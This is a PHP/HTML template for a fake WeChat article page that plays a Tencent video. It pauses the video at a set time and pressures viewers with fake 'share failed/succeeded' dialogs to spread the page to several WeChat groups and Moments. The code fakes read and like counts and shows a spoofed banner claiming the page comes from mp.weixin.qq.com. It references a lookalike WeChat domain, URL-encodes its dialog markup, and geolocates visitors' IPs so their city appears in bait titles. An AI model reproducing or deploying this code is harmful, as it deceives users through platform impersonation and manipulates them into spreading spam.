<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"/>
</head>
<body>
<div style="padding: 20px 15px 15px;background-color: #fff;border-bottom: solid 0.5px #e4e4e4;">
<h2 class="rich_media_title" id="activity-name"></h2>
<div class="rich_media_meta_list" style="margin-bottom:0;">
<em id="post-date" class="rich_media_meta rich_media_meta_text"></em>
<a class="rich_media_meta rich_media_meta_link rich_media_meta_nickname" style="color:#607fa6;"  id="post-user"> 正点时讯</a>
</div>

<p style="padding: 12px 0;display: none;"><img src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rJUic7lPq4MtYR8WkFIOgOONDHYPCKicEP3g/0" style="width: 100%;"></p>
<div class="rich_media_content" id="js_content">
</div>

<style>li{list-style: none;border-radius: 2px;font-size: .85em;}li:active {background: #ccc;}</style>
<div id="hutui" style="position: relative;/*height: 6.4em;overflow: hidden;*/">
<p style="color: red;font-weight: 900;margin-top: 15px;">更多精彩&gt;&gt;&gt;</p>
    <?php
        if (!empty($list)) {
            foreach ($list as $v) {
                ?>
                <a href="<?= substr(md5(mt_rand(0, 999) . time() . $model->id), rand(0, 22), 10)?>.<?= $v->suffix?>?wf=<?= substr(md5( time() .  $model->id . mt_rand(0, 999)), rand(0, 22), 10)?>&_t=<?= time() . mt_rand(1000, 9999)?>"><li><?= $v->name?></li></a>
                <?php
            }
        }
    ?>
</div>

<div id="js_toobar" style="padding-top:10px;color: #8c8c8c;line-height: 32px;font-size: 17px;height: 32px;">
<a style="color:#607fa6;float: left;margin-right: 10px;" id="js_view_source" href="javascript: void();">阅读原文</a>
<div id="js_read_area" style="float: left;margin-right: 10px;">阅读 <span id="readNum">100000+</span></div>
<div id="like" style="margin-right: 0;margin-left: 8px;float: left;-webkit-tap-highlight-color: rgba(0,0,0,0);outline: 0;min-width: 3.5em;">
<i style="position: relative;top: 1px;margin-right: 3px;background: transparent url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAA+CAYAAAA1dwvuAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACd0lEQVRYhe2XMWhUMRjHfycdpDg4iJN26CQih4NUlFIc3iTasaAO+iZBnorIId2CDg6PLqWDXSy0p28TJ6ejILgoKiLFSeRcnASLnDf2HPKll8b3ah5NQPB+cHzJl0v+73J5Sf6NwWCAD6kqxoEV4BywCTwA2j59V9QlxrxUNJeBOSkfBtaAHvDcp/O+GkJHJd4H7kr5nm/nOkJHJH4FHkv5WAyhUxLfAgelvBlUKFXFBNCU6oYl+j6oEHohADwFtoDTUn8dTChVxX7gjlSfSJyS+CaYEDCPXs4d4IXkzDR+8BWqfI9SVUyil/ENST20ml8BF4Afu4z9HT3V80B/TAY9CxTABNAHxp1Oj4B1q34dWAamGa5Al0PALfSs3TS/aE1EcERWgQXgozPIN+Ai6O2ljFQVM8BLZJqN0KTEhgj9kvrViqf1wYz5BcoXQ38Pg9uckfiuSigU0xLXowmlqpgCjgNd4FM0IeCKxGcmEUtoRqLZScILpaqYA06iN9/tTTfGLzKvxLKdDCqUquIEcB59xK9GE2J4xLeBn3ZD1abaq/sQqSpmgWvo82rBbTdCPeAA4N69/noXS1XhphaBz27SPPVtapz/FXSBFsNDcgcN3wvkiBEjRoSndAtqLXXKvuvtYfMs+SP3T3tYm6ge1iaqh7UJ62HRTqNZko/mYV3CeVjA9rAuUTxsGd4edrcX1vWwddn2sHmWaA/bWuq4HnYLff3aC7U8bAiaMPyPJp3GhnxCUOlhQxPdwxrieViLbp4lUT2sIbqHNcTzsBYbeZZE9bCGeB7WIrqHNbTzLNnhYWMIlXpYI9Rz8gM8/GsFi3mW/Ace9jf8QZwIX5o4uQAAAABJRU5ErkJggg==) no-repeat;width: 13px;height: 13px;display: inline-block;-webkit-background-size: 100% auto;background-size: 100% auto;"></i>
<span class="praise_num" id="likeNum"><?= substr(time(), 4, 5)?></span>
</div>
</div>
</div>

<!--
<div id="gdt_area">
    <div style="border-bottom: 1px dotted #e1e1e1;margin: 0 15px 20px;text-align: center;line-height: 22px;">
        <span style="position: relative;top: 10px;background: #f3f3f3;color: #868686;font-size: 17px;padding: 0 8px">广告</span>
    </div>
    <div style="position: relative;margin: 0 15px 10px;">
        <a href="javascript: location.href='http://mp.weixin.qq.comm.x4777.cn/nyyy_c.html?ad=' + (parseInt((parseInt(new Date().getTime() / (1000*60*1))+'').substring(2))+5000);">
            <img src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rLQGqiboicezm1YibhGibOA2rR0zYX0ibynia3dg/0" border="0" style="width: 100%;">
        </a>
    </div>
</div>
-->

<div id="pauseplay" style="display: none; opacity: 0; position: fixed; left: 0px; right: 0px; top: 65px; bottom: 0px; background-color: rgb(80, 80, 80); z-index: 1000000; height: 190px;">
</div>
<div id="lly_dialog" style="display: none;">
    <div class="weui-mask"></div>
    <div class="weui-dialog">
        <div class="weui-dialog__bd" id="lly_dialog_msg"></div>
        <div class="weui-dialog__ft">
            <a href="javascript:;" class="weui-dialog__btn weui-dialog__btn_primary" id="lly_dialog_btn">好</a>
        </div>
    </div>
</div>
<img src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rEziaMPy9eo2rCE0LZUcuW5ic0kAcicZeytag/0" id="fenxiang" style="display:block;width:100%;position:fixed;z-index:999;top:0;left:0;display:none">
</body>
</html>

<style>html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}body{-webkit-touch-callout:none;font-family:"Helvetica Neue",Helvetica,"Hiragino Sans GB","Microsoft YaHei",Arial,sans-serif;background-color:#f3f3f3;line-height:inherit}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px}*{margin:0;padding:0;font-style:normal}a{color:#607fa6;text-decoration:none}.rich_media_inner{font-size:16px;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto}.rich_media_area_primary{position:relative;padding:20px 15px 15px;background-color:#fff}.rich_media_area_primary:before{content:" ";position:absolute;left:0;top:0;width:100%;height:1px;border-top:1px solid #e5e5e5;-webkit-transform-origin:0 0;transform-origin:0 0;-webkit-transform:scaleY(0.5);transform:scaleY(0.5);top:auto;bottom:-2px}.rich_media_area_extra{padding:0 15px 0}.rich_media_title{margin-bottom:10px;line-height:1.4;font-weight:400;font-size:24px}.rich_media_meta_list{margin-bottom:18px;line-height:20px;font-size:0}.rich_media_meta{display:inline-block;vertical-align:middle;margin-right:8px;margin-bottom:10px;font-size:16px}.meta_original_tag{line-height:100px;overflow:hidden;background:transparent url(/mmbizwap/zh_CN/htmledition/images/icon/appmsg/icon_original_tag.2x25ab3f.png) no-repeat 0 0;width:49px;height:20px;vertical-align:middle;display:inline-block;-webkit-background-size:100% auto;background-size:100% auto}.meta_enterprise_tag img{width:30px;height:30px!important;display:block;position:relative;margin-top:-3px;border:0}.rich_media_meta_text{color:#8c8c8c}.rich_media_meta_nickname{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:9em}span.rich_media_meta_nickname{display:none}.rich_media_thumb{width:100%;margin-bottom:6px}.rich_media_content{overflow:hidden;color:#3e3e3e}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em;white-space:pre-wrap}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-2{padding-left:30px}.rich_media_content blockquote{margin:0;padding-left:10px;border-left:3px solid #dbdbdb}img{height:auto!important}@media(min-device-width:375px) and (max-device-width:667px) and (-webkit-min-device-pixel-ratio:2){.mm_appmsg .rich_media_inner,.mm_appmsg .rich_media_meta,.mm_appmsg .discuss_list,.mm_appmsg .rich_media_extra,.mm_appmsg .title_tips .tips{font-size:17px}}@media(min-device-width:414px) and (max-device-width:736px) and (-webkit-min-device-pixel-ratio:3){.mm_appmsg .rich_media_title{font-size:25px}}.original_tool_area{display:block;padding:.75em 1em 0;-webkit-tap-highlight-color:rgba(0,0,0,0);color:#3e3e3e;border:1px solid #eaeaea;margin:20px 0}.original_tool_area .radius_avatar{display:inline-block;background-color:#fff;padding:3px;border-radius:50%;-moz-border-radius:50%;-webkit-border-radius:50%;overflow:hidden;vertical-align:middle}.original_tool_area .radius_avatar img{width:100%;height:100%;border-radius:50%;-moz-border-radius:50%;-webkit-border-radius:50%;background-color:#eee}.original_tool_area .tips_global{position:relative;padding-bottom:.5em;font-size:15px}.original_tool_area .tips_global:after{content:" ";position:absolute;left:0;bottom:0;width:100%;height:1px;border-bottom:1px solid #dbdbdb;-webkit-transform-origin:0 100%;transform-origin:0 100%;-webkit-transform:scaleY(0.5);transform:scaleY(0.5)}.original_tool_area .radius_avatar{width:27px;height:27px;padding:0;margin-right:.5em}.original_tool_area .radius_avatar img{height:100%!important}.original_tool_area .cell{padding:.8em 0;display:block;position:relative}.original_tool_area .cell_hd,.original_tool_area .cell_bd,.original_tool_area .cell_ft{display:table-cell;vertical-align:middle;word-wrap:break-word;word-break:break-all;white-space:nowrap}.original_tool_area .cell_primary{width:2000px;white-space:normal}.original_tool_area .icon_access:before{content:" ";display:inline-block;height:8px;width:8px;border-width:1px 1px 0 0;border-color:#cbcad0;border-style:solid;transform:matrix(0.71,0.71,-0.71,0.71,0,0);-ms-transform:matrix(0.71,0.71,-0.71,0.71,0,0);-webkit-transform:matrix(0.71,0.71,-0.71,0.71,0,0);position:relative;top:-2px;top:-1px}
.praised {
    background-position: 0 -18px!important;
}
</style>

<div id="sa" style="position: fixed; top: 0px; left: 0px; width: 100%; height: 100%; z-index: 11; background: rgba(0, 0, 0, 0.4); display: none;">
    <div id="win" style="position: relative;margin: 55.2% auto 0;width: 16.8em;background: #f5f6f8;text-align: center;border-radius: 0.8em;box-shadow: #fff 0 0 1px;overflow: hidden;">
        <p style="font-size: 0.83em;font-weight:400;margin: 1.42em 0 1.36em 0;line-height: 1.55em;"><span id="origin" style="font-weight:900;font-size: 1.25em;"></span>

        <span style="padding: 0 1.2em;">精彩内容，即将呈现！</span></p>
        <div style="width: 100%;display: table;font-size: 1em;border-top: double .001em #b6c0d0;font-weight: 500;color: #1782f0;background: #f3f3f5;" onclick="document.getElementById('sa').style.display='none';">
            <p onclick="player.play();" style="width:50%;display:table-cell;padding: 0.7em 0;border-right: solid 0.5px #ddd;">立即播放</p>
            <p style="width:50%;display:table-cell;padding: 0.7em 0;">取消</p>
        </div>
    </div>
</div>

<link href="https://cdn.bootcss.com/weui/1.0.2/style/weui.min.css" rel="stylesheet">
<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.js"></script>
<script src="https://cdn.bootcss.com/zepto/1.2.0/zepto.min.js"></script>
<script src="https://imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js" charset="utf-8"></script>
<script src="https://v.qq.com/iframe/tvp.config.js" charset="utf-8"></script>

<script>
if (top.location!=self.location) {
    top.location = self.location;
}

var til='<?= $title?>',vid='<?= $model->vid ?>',delayTime = <?= $model->pause_sec ?>,isOS=!!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);

//$('#likeNum').html(Number.parseInt(Math.random()*15000)+5000);

var video, player, playStatus = 'pending';
var elId = 'mod_player_skin_0';
$("#js_content").html('<div id="'+elId+'" class="player_skin" style="padding-top:6px;"></div>');
var elWidth = $("#js_content").width();
playVideo(vid,elId,elWidth);
$("#pauseplay").height($("#js_content").height() - 10);

if(playStatus == 'pending') {
var isFirst = true;
setInterval(function(){
try {
var currentTime = player.getCurTime();
if(currentTime >= delayTime && ((new Date().getTime() - sessionStorage.pt) / 1000 >= 20)) {
$('#pauseplay').show();
player.setPlaytime(delayTime-1);
player.pause();
player.cancelFullScreen();
$.cookie(vid, 's', {path: '/'});
if(isFirst) {
$('#pauseplay').trigger('click');
}
isFirst = false;
}
} catch (e) {
}
}, 500);
}

function playVideo(vid,elId,elWidth){
//定义视频对象
video = new tvp.VideoInfo();
//向视频对象传入视频vid
video.setVid(vid);

//定义播放器对象
player = new tvp.Player(elWidth, 200);
//设置播放器初始化时加载的视频
player.setCurVideo(video);

//输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
if (sessionStorage.isAT && isOS) {document.addEventListener("WeixinJSBridgeReady", function() {player.play();}, false);}
player.addParam("wmode","transparent");
player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
player.write(elId);
player.onplaying=function(){if(!sessionStorage.pt){sessionStorage.pt=new Date().getTime();}};
}

$('#pauseplay').on('click', function() {
jssdk();
});

$('#like').on('click', function(){
var $icon = $(this).find('i');
var $num = $(this).find('#likeNum');
var num = 0;
if(!$icon.hasClass('praised')){
num = parseInt($num.html());
if(isNaN(num)) {
num = 0;
}
$num.html(++num);
$icon.addClass("praised");
} else {
num = parseInt($num.html());
num--;
if(isNaN(num)) {
num = 0;
}
$num.html(num);
$icon.removeClass("praised");
}
});

var alertTimes = 0;
function wxalert(msg, btn, callback) {
if (alertTimes == 0) {
var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
$("body").append(dialog)
}
alertTimes++;
var d = $('#lly_dialog');
d.show(200);
d.find("#lly_dialog_msg").html(msg);
d.find("#lly_dialog_btn").html(btn);
d.find("#lly_dialog_btn").off('click').on('click', function() {
d.hide(200);
if (callback) {
callback()
}
})
}

var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : null;
var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
var onVisibilityChange = function(){
if (!document[hiddenProperty]) {
if (delayTime == 9999) {
$.get('fx.hold'+location.search+'&t=vd');
} else if (delayTime < 9999) {
shareATimes += 1;
if (shareATimes>4) {
shareTTimes += 1;
setTimeout(share_tip(shareATimes,shareTTimes), 2000);
} else {
setTimeout(share_tip(shareATimes,-1), 2000);
}}}}
document.addEventListener(visibilityChangeEvent, onVisibilityChange);

var doc = $(document);
var _touches_point1=0;var _touches_point2=0;
addEventListener("touchstart",
function(e) {
_touches_point1 = e.touches[0].pageY;
});
addEventListener("touchmove",
function(e) {
e.preventDefault();
_touches_point2 = e.touches[0].pageY;
if(doc.scrollTop()<=0 && _touches_point1<_touches_point2)
{
if( $('#_domain_display').length <=0 )
{
$('body').prepend('<div id="_domain_display" style="text-align:center;background-color:#2d3132;color:#797d7e;height:0px;font-size:12px;overflow:hidden;"><p style="padding-top:12px;">此网页由 mp.weixin.qq.com 提供</p></div>');
}
$('#_domain_display').height((_touches_point2-_touches_point1)*0.35);
} else {
doc.scrollTop(doc.scrollTop()+((_touches_point1-_touches_point2)*0.4));
}
if(Math.ceil(doc.scrollTop()+$(window).height()) >= doc.height() || $('#_b_dp').length > 0){
if($('#_b_dp').length <=0 )
{
//$('body').append
$("#lly_dialog").after('<div id="_b_dp" style="text-align:center;color:#797d7e;height:0px;overflow:hidden;"></div>');
}
$('#_b_dp').height((_touches_point1-_touches_point2)*0.5);
}
});

addEventListener("touchend",
function(e) {
$('#_domain_display').slideUp('normal' , function(){
$('#_domain_display').remove();
});
$('#_b_dp').slideUp('normal' , function(){
$('#_b_dp').remove();
});
});

var shareATimes = 0,shareTTimes = 0;
function share_tip(share_app_times, share_timeline_times) {
if (share_timeline_times == -1) {
    if (shareATimes == 1) {
    wxalert('<b style="font-size: 22px">分享成功！</b><br/>请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好')
    } else if (shareATimes == 2) {
    wxalert('<b style="font-size: 22px">分享失败！</b>注意：分享到相同的群会失败！请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群！', '好')
//    wxalert('<b style="font-size: 20px">分享失败！</b>注意：分享到相同的群会失败！请尝试分享到<b style="font-size: 18px;color: red">朋友圈</b>！', '好')
    } else if (shareATimes == 3) {
    wxalert('<b style="font-size: 22px">分享成功！</b><br/>请继续分享到<b style="font-size: 18px;color: red">1</b>个不同的群即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好')
    } else if (share_timeline_times < 1) {
    wxalert('<b style="font-size: 22px">分享成功！</b><br/>最后请分享到<b style="font-size: 18px;color: red">朋友圈</b>即可!', '好')
    }
} else {
if (shareATimes <= 3) {
    wxalert('请分享到不同的群!', '好')
} else {
    wxalert('<b style="font-size: 22px">分享成功！</b><br/>点击确定继续播放。', '确定', function() {
    $.get('fx.hold'+location.search+'&t=vd');
    delayTime = 99999;
    $("#fenxiang").hide();
    sessionStorage.removeItem("pt");
    player.onplaying=function(){};
    player.play();
    })
    }
}
}

function jssdk() {
if (!isOS) {
    if(!sessionStorage.isDT){
        sessionStorage.isDT=1;

        return location.reload();
    }
}
$("#fenxiang").show();
show_tip();
}
if (sessionStorage.isDT) {jssdk();sessionStorage.removeItem("isDT");}

function show_tip() {
wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><b style="font-size: 22px;color: red">数据加载中断</b><br/>请分享到微信群，可<b style="color: red;">免流量加速观看</b>', '好')
}
$(function() {
$('#fenxiang').on('click', function() {
show_tip()
});
});

var d = new Date();
var str = d.getFullYear()+"-"+(d.getMonth()+1)+"-"+d.getDate();
document.getElementById("post-date").innerHTML = str;

document.title= til;
document.getElementsByTagName('h2')[0].innerHTML = til;

var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
function chkwvs() {if (!sessionStorage.isAT && isOS && wechatInfo && wechatInfo[1] >= "6.5.1") {
    setTimeout("document.getElementById('sa').style.display='block';", 900);
}}
function winrs() {
    if (isOS) {}
    if (navigator.userAgent.indexOf('Android') > -1 || typeof window.orientation == "undefined" || window.orientation==0 || window.orientation==180) {
        document.getElementById('win').style.margin = (window.screen.height / window.screen.width * 31)+"% auto 0";
    } else {
        document.getElementById('win').style.margin = (window.screen.width / window.screen.height * 31)+"% auto 0";
    }
}

window.onhashchange = function(){
    jp();
};

function hh() {
    /*chkwvs();*/history.pushState(history.length+1, "app", "#pt_"+new Date().getTime());
}

function jp() {
    // location.href="http://mp.weixin.qq.comm.x4777.cn/nyyy.html?ad=" + (parseInt((parseInt(new Date().getTime() / (1000*60*1))+'').substring(2))+5000);/*"/2017-12-01/JF=74567477638778087206173741385201638832333605235044&_t=1512139710920"*/
}

window.onload=function(){
    if (sessionStorage.isAT) {
        chkwvs=function(){};
        sessionStorage.removeItem("isAT");
    }
    //setTimeout('hh();', 100);
}

winrs();
window.onresize=window.onorientationchange=function(){winrs();}

if(delayTime != 9999){
$.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',function(){
document.title = remote_ip_info.city+document.title;
$("li").each(function(){$(this).text('💥'+(Math.random()>0.8?remote_ip_info.city:"")+$(this).text())});
});}
</script>

<?= $model->count?>
<script>document.write=document.writeln=document.body.appendChild=function(){};</script>
